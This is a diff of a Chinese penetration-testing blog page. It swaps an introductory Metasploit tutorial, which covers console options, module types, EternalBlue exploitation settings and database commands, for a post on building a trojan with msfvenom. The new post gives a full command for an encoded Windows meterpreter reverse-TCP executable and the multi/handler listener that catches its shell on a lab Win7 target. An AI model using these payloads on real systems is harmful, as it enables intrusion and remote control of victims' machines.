@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="初识msf, Nbb&#39;s Blog">
+    <meta name="keywords" content="msfvenom生成木马, Nbb&#39;s Blog">
     <meta name="description" content="It&#39;s Nbb&#39;s Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>初识msf | Nbb&#39;s Blog</title>
+    <title>msfvenom生成木马 | Nbb&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -204,12 +204,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">初识msf</h1>
+                    <h1 class="description center-align post-title">msfvenom生成木马</h1>
                 </div>
             </div>
         </div>
@@ -330,6 +330,10 @@
                                 <span class="chip bg-color">msf</span>
                             </a>
                         
+                            <a href="/tags/%E6%9C%A8%E9%A9%AC/">
+                                <span class="chip bg-color">木马</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -367,140 +371,19 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>msf，由前辈高人创建的一个渗透测试框架，试图用这一个框架解决渗透测试的需要的各种功能，确实不是一般人敢想的事，这是一个基于命令行的工具，由ruby编写，框架的功能细分到各个模块来实现，截至写这篇文章的时候是6.0.18版本，有几千个模块，分别用以实现扫描探测，漏洞利用，以及神秘的后渗透</p>
-<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>msf由核心的框架程序组织各模块运行，并与后台的postgre数据库交互，我们msf中调用模块实现功能，获取的数据存在数据库中</p>
-<p><img src="1.jpg" alt="架构"></p>
-<h2 id="模块分类"><a href="#模块分类" class="headerlink" title="模块分类"></a>模块分类</h2><h3 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h3><p>漏洞利用模块，在确定漏洞后可以对漏洞进行利用，分为主动和被动两种</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>攻击的载荷</p>
-<h3 id="auxiliary"><a href="#auxiliary" class="headerlink" title="auxiliary"></a>auxiliary</h3><p>扫描模块，包括服务，端口，漏洞等各种扫描</p>
-<h3 id="encoder"><a href="#encoder" class="headerlink" title="encoder"></a>encoder</h3><p>编码模块，可以加密payload，实现免杀</p>
-<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><p>后渗透时使用的模块，扩大战果</p>
-<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>先看一下帮助列表</p>
-<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">┌──(root💀kali)-[~]
-└─# msfconsole -h                                                                                                                   
-Usage: msfconsole [options]
-
-Common options:
-    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'
-
-Database options:
-    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
-    -n, --no-database                Disable database support
-    -y, --yaml PATH                  Specify a YAML file containing database settings
-
-Framework options:
-    -c FILE                          Load the specified configuration file
-    -v, -V, --version                Show version
-
-Module options:
-        --defer-module-loads         Defer module loading unless explicitly asked
-    -m, --module-path DIRECTORY      Load an additional module path
-
-Console options:
-    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
-    -H, --history-file FILE          Save command history to the specified file
-    -L, --real-readline              Use the system Readline library instead of RbReadline
-    -o, --output FILE                Output to the specified file
-    -p, --plugin PLUGIN              Load a plugin on startup
-    -q, --quiet                      Do not print the banner on startup
-    -r, --resource FILE              Execute the specified resource file (- for stdin)
-    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
-    -h, --help                       Show this message<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<p>msfconsole命令直接进入msf的命令行，比较有用的参数是-r和-x，可以用来解决重复性工作，还有一些比如-v查看版本，-q隐藏banner静默启动<br>-r 指定一个以rc结尾资源文件，执行其中命令<br>-x 把命令合成一个字符串，相互以分号；间隔，msf会逐条解析运行，就不用进入msf一条一条敲了相当于php的eval</p>
-<h3 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h3><p>我们以一个普通的模块的使用过程来讲解msf的基本用法，进入msf后可以用show命令查看各类模块下具体都有什么模块，show exploits就可以查看所有的exploits模块</p>
-<p><img src="2.jpg" alt="show exploits执行结果"></p>
-<p>可以看到一共是2079个模块以及他们的详细信息，msf的命令是支持-h参数的，要是忘了怎么用可以-h参数看一下</p>
-<p>search命令可以查找我们想要的模块，比如我们搜索著名的17_010</p>
-<p><img src="3.jpg" alt="search结果"></p>
-<p>可以看到有俩扫描和三个漏洞利用模块，use命令进入模块</p>
-<p><img src="4.jpg" alt="进入模块"></p>
-<p>进入后可以用info命令看一下模块详细信息</p>
-<p><img src="5.jpg" alt="info"></p>
-<p>挺长的一段话，包括名字，平台，时间，评价，提供者，适用目标，是否支持check，需要的参数，payload相关信息，模块的描述以及参考连接</p>
-<p>show targets和show payloads可以查看目标和可用payload，targets和info中的其实是一样的</p>
-<p><img src="6.jpg" alt="show结果"></p>
-<p>show options查看参数</p>
-<p><img src="7.jpg" alt="参数"></p>
-<p>可以看见该模块的参数，module options下面是模块的参数，payload和target是模块自动加载的，下面是他们各自的参数，required显示yes的表示是一定要设置的参数</p>
-<p>set设置参数，rhosts就是目标主机，rport是目标端口，加载的payload是meterpreter的反弹shell，lhost是shell反弹到的IP地址，lport是反弹到的端口</p>
-<p><img src="8.jpg" alt="设置参数"></p>
-<p>可以看到options中参数已经设置好了，set会覆盖之前的参数，如果输错可以直接覆盖，取消则可以用unset，会把参数置空，而有的参数每次都是一样的，一次次设很麻烦，就可以用setg，unsetg来设置全局变量，我的lhost和lport就是设置的全局变量，就不用每次自己设置了</p>
-<p>show advanced可以查看高级参数，这些参数用的比较少</p>
-<p><img src="11.jpg" alt="高级参数"></p>
-<p>参数都设置好之后就可以跑了，run或exploit执行模块，有的模块支持check，可以先试试是否存在漏洞</p>
-<p><img src="10.jpg" alt="check"></p>
-<p><img src="9.jpg" alt="执行"></p>
-<p>可以看到shell已经弹回来了，已经进入了shell命令行，如果不想直接进入shell命令行可以用-j参数，静默执行，弹回来的shell会话会记录在后台</p>
-<p><img src="12.jpg" alt="后台执行"></p>
-<p>可以看到执行完并没有进入shell，sessions查看会话可以看见会话已经建立了</p>
-<p>关于会话，session -i进入会话，-k杀死会话，在meterpreter shell中background是退出但是不关闭会话，</p>
-<p><img src="13.jpg" alt="会话操作"></p>
-<p>back退出模块，exit退出msf，退出前使用save命令可以保存当前设置到一个配置文件，在下次进入时还原当前状态</p>
-<p><img src="14.jpg" alt="save"></p>
-<p>其实这个配置文件里就是我们当前模块，配置的参数等之类的数据，删除配置文件之后进入就会是默认的msf状态了</p>
-<p><img src="15.jpg" alt="配置文件"></p>
-<h2 id="数据库相关"><a href="#数据库相关" class="headerlink" title="数据库相关"></a>数据库相关</h2><h3 id="msf命令行外"><a href="#msf命令行外" class="headerlink" title="msf命令行外"></a>msf命令行外</h3><p>可以用msfdb命令管理数据库，msfdb 【command】</p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>init</td>
-<td>启动并初始化</td>
-</tr>
-<tr>
-<td>reinit</td>
-<td>删除并初始化</td>
-</tr>
-<tr>
-<td>delet</td>
-<td>删除并停止数据库</td>
-</tr>
-<tr>
-<td>stop</td>
-<td>停止数据库</td>
-</tr>
-<tr>
-<td>status</td>
-<td>检查数据库</td>
-</tr>
-<tr>
-<td>run</td>
-<td>启动数据库和msf</td>
-</tr>
-</tbody></table>
-<h3 id="msf命令行内"><a href="#msf命令行内" class="headerlink" title="msf命令行内"></a>msf命令行内</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>db_status</td>
-<td>数据库状态</td>
-</tr>
-<tr>
-<td>db_rebuild_cache</td>
-<td>重新建立数据库中模块信息，用于search，show等操作</td>
-</tr>
-<tr>
-<td>db_disconnection</td>
-<td>断开数据库连接</td>
-</tr>
-<tr>
-<td>db_connect</td>
-<td>-y指定msf配置文件连接数据库，默认在msf目录下的/config/database.yml</td>
-</tr>
-</tbody></table>
-<p>msf模块获取的结果都会存在数据库中，hosts命令可以查看数据库中存有的的主机信息，vulns可以查看漏洞信息，services命令可以查看服务信息</p>
-<p><img src="16.jpg" alt="数据库信息"></p>
+                <h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>msfvenom可以利用msf的payload来生成木马，可以生成各种形式的木马，也可以指定可执行文件的模板，用编码器进行编码，当然这个编码的免杀肯定是不行的，杀软厂商早就研究的透透的，据说msf的商业版吊打杀软，哇哦</p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>假定以meterpreter的反弹shell为payload，msfvenom –payload-options -p windows/shell/reverse_tcp可以查看payload可以设置的参数</p>
+<p><img src="1.jpg" alt="查看参数"></p>
+<p>生成木马 msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.59.139 lport=4444 -e x86/shikata_ga_nai -i 10 -f exe -o 1.exe </p>
+<p>-a 架构<br>–platform 平台<br>-p payload<br>监听IP端口<br>-e 编码模块<br>-i 几轮加密<br>-f 输出格式<br>-o 输出文件名</p>
+<p><img src="2.jpg" alt="生成"></p>
+<p>这个文件被执行会弹回一个shell，但是这个模块和17_010那种漏洞利用模块不一样，我们还需要在本地监听一下回弹的shell，需要用exploit/multi/handler模块</p>
+<p><img src="3.jpg" alt="监听模块"></p>
+<p>需要先设置payload，再设置参数，lhost监听IP，lport监听端口，然后运行</p>
+<p><img src="5.jpg" alt="监听"></p>
+<p><img src="6.jpg" alt="后台运行"></p>
+<p>目标win7运行木马后就会获得shell</p>
+<p><img src="7.jpg" alt="shell"></p>
 
             </div>
             <hr/>
@@ -526,7 +409,7 @@ Console options:
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/01/12/chu-shi-msf/">http://example.com/2021/01/12/chu-shi-msf/</a>
+                    <a href="http://example.com/2021/01/12/msfvenom-sheng-cheng-mu-ma/">http://example.com/2021/01/12/msfvenom-sheng-cheng-mu-ma/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -568,6 +451,10 @@ Console options:
                                     <span class="chip bg-color">msf</span>
                                 </a>
                             
+                                <a href="/tags/%E6%9C%A8%E9%A9%AC/">
+                                    <span class="chip bg-color">木马</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -607,9 +494,10 @@ Console options:
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/01/12/msfvenom-sheng-cheng-mu-ma/">
                     <div class="card-image">
@@ -627,9 +515,9 @@ Console options:
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -642,6 +530,7 @@ Console options:
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -664,13 +553,13 @@ Console options:
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/01/11/recon-ng/">
+                <a href="/2021/01/12/chu-shi-msf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="recon-ng">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="初识msf">
                         
-                        <span class="card-title">recon-ng</span>
+                        <span class="card-title">初识msf</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -681,14 +570,14 @@ Console options:
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-12
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="post-category">
-                                    信息搜集
+                            <a href="/categories/msf/" class="post-category">
+                                    msf
                                 </a>
                             
                             
@@ -698,8 +587,8 @@ Console options:
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
-                        <span class="chip bg-color">信息搜集</span>
+                    <a href="/tags/msf/">
+                        <span class="chip bg-color">msf</span>
                     </a>
                     
                 </div>
